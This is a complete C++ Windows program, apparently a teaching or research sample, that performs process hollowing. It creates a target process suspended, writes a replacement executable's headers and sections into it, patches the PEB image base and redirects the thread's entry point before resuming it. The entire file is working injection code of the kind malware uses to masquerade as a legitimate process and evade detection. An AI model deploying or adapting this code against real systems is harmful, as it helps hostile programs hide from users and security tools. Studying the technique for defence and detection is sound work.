// Hollow.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <Windows.h>
#include <stdio.h>
#include <winternl.h>
#include <Psapi.h>
#include <ImageHlp.h>
#include <assert.h>

#pragma comment(lib, "imagehlp")
#pragma comment(lib, "ntdll")

PROCESS_INFORMATION pi;

int Error(const char* text) {
	printf("%s (%u)\n", text, GetLastError());
	if(pi.hProcess)
		TerminateProcess(pi.hProcess, 0);
	return 1;
}

int main(int argc, char* argv[]) {
	if (argc < 3) {
		printf("Usage: Hollow <image_name> <replacement_exe>\n");
		return 0;
	}

	auto name = argv[1];
	auto replace = argv[2];

	STARTUPINFOA si = { sizeof(si) };
	if (!CreateProcessA(nullptr, name, nullptr, nullptr, FALSE, CREATE_SUSPENDED, nullptr, nullptr, &si, &pi))
		return Error("Failed to create process");

	printf("Created PID: %u\n", pi.dwProcessId);

	// for convenience, set current directory to where our EXE is
	WCHAR path[MAX_PATH];
	GetModuleFileName(nullptr, path, _countof(path));
	*wcsrchr(path, L'\\') = 0;
	SetCurrentDirectory(path);

	HANDLE hFile = CreateFileA(replace, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, 
		nullptr, OPEN_EXISTING, 0, nullptr);
	if (hFile == INVALID_HANDLE_VALUE)
		return Error("Failed to open file");

	PVOID newAddress = VirtualAllocEx(pi.hProcess, nullptr, 
		GetFileSize(hFile, nullptr) + (1 << 20),	// extra 1MB in case it's needed
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!newAddress)
		return Error("Failed to allocate memory");

	printf("Address in target process: 0x%p\n", newAddress);

	ULONG orgSize, newSize;
	ULONG64 oldImageBase, newImageBase = (ULONG64)newAddress;

	if (!ReBaseImage64(replace, nullptr, TRUE, FALSE, FALSE, 0, 
		&orgSize, &oldImageBase, &newSize, &newImageBase, 0))
		return Error("Failed to rebase image");

	HANDLE hMemFile = CreateFileMapping(hFile, nullptr, PAGE_READONLY, 0, 0, nullptr);
	if (!hMemFile)
		return Error("Failed to create MMF");

	CloseHandle(hFile);

	PVOID address = MapViewOfFileEx(hMemFile, FILE_MAP_READ, 0, 0, 0, newAddress);
	if (!address)
		return Error("Failed to map in requested address");

	auto dosHeader = (PIMAGE_DOS_HEADER)address;
	auto nt = (PIMAGE_NT_HEADERS)((BYTE*)address + dosHeader->e_lfanew);
	auto sections = (PIMAGE_SECTION_HEADER)(nt + 1);

	SIZE_T written;
	// copy header
	WriteProcessMemory(pi.hProcess, (PVOID)newAddress, 
		(PVOID)nt->OptionalHeader.ImageBase, nt->OptionalHeader.SizeOfHeaders, &written);

	// copy sections
	for (ULONG i = 0; i < nt->FileHeader.NumberOfSections; i++) {
		WriteProcessMemory(pi.hProcess, 
			PVOID((PBYTE)newAddress + sections[i].VirtualAddress), 
			PVOID(sections[i].PointerToRawData + nt->OptionalHeader.ImageBase), 
			sections[i].SizeOfRawData, &written);
	}

	// get PEB of target
	PROCESS_BASIC_INFORMATION pbi;
	NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), nullptr);
	PVOID peb = pbi.PebBaseAddress;

/*
	typedef struct _PEB {
		BOOLEAN InheritedAddressSpace;
		BOOLEAN ReadImageFileExecOptions;
		BOOLEAN BeingDebugged;
		BOOLEAN BitField;

		HANDLE Mutant;

		PVOID ImageBaseAddress;
		...
*/
	// update PEB with new image base
	WriteProcessMemory(pi.hProcess, (PBYTE)peb + sizeof(PVOID) * 2, 
		&nt->OptionalHeader.ImageBase, sizeof(PVOID), &written);

	CONTEXT context;
	context.ContextFlags = CONTEXT_INTEGER;
	GetThreadContext(pi.hThread, &context);
#ifdef _WIN64
	// for x64, RCX points to the next instruction
	context.Rcx = (DWORD64)(nt->OptionalHeader.AddressOfEntryPoint + (DWORD64)newAddress);
#else
	// for x86, EBX points to the next instruction
	context.Ebx = (DWORD)(nt->OptionalHeader.AddressOfEntryPoint + (DWORD)newAddress);
#endif
	SetThreadContext(pi.hThread, &context);

	UnmapViewOfFile(address);
	ResumeThread(pi.hThread);
	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);

	return 0;
}
